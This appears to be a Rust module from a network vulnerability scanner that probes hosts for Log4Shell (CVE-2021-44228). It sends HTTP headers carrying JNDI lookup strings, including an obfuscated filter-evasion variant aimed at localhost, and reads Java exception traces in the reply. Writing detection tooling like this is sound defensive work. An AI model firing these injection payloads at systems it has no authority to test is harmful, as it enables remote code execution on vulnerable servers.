use async_trait::async_trait;
use std::net::IpAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

use crate::engine::{Checker, VulnResult, VulnSeverity};

pub struct Log4Shell;

#[async_trait]
impl Checker for Log4Shell {
    fn name(&self) -> &'static str {
        "log4shell"
    }

    fn ports(&self) -> &'static [u16] {
        &[80, 443, 8080, 8443, 8000, 9200, 9300]
    }

    async fn check(&self, ip: IpAddr, port: u16) -> VulnResult {
        let addr = format!("{}:{}", ip, port);
        let Some(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr))
            .await
            .ok()
            .and_then(|r| r.ok())
        else {
            return VulnResult::safe(self.name());
        };

        // CVE-2021-44228: Log4Shell detection via JNDI lookup in headers.
        // We use a canary string pattern — safe probe (no actual JNDI endpoint needed).
        // A real scanner would use a DNS callback; here we detect via error/response signature.
        let payload = format!(
            "GET / HTTP/1.1\r\nHost: {}:{}\r\nX-Api-Version: ${{jndi:ldap://127.0.0.1:1389/a}}\r\nUser-Agent: ${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://127.0.0.1:1389/a}}\r\nAccept: */*\r\n\r\n",
            ip, port
        );
        if stream.write_all(payload.as_bytes()).await.is_err() {
            return VulnResult::safe(self.name());
        }

        let mut buf = [0u8; 2048];
        let Ok(Ok(n)) = timeout(Duration::from_secs(3), stream.read(&mut buf)).await else {
            return VulnResult::safe(self.name());
        };

        let resp = String::from_utf8_lossy(&buf[..n]);
        // Connection errors or specific Java exception traces hint at Log4j processing the payload
        // This is a heuristic — definitive detection requires DNS callback infrastructure
        if resp.contains("java.")
            || resp.contains("NamingException")
            || resp.contains("javax.naming")
        {
            VulnResult::vuln(
                self.name(),
                VulnSeverity::Critical,
                format!(
                    "Log4Shell (CVE-2021-44228) Java JNDI trace detected on {}:{} — confirm with DNS callback",
                    ip, port
                ),
            )
            .with_cve("CVE-2021-44228")
        } else {
            VulnResult::safe(self.name())
        }
    }
}
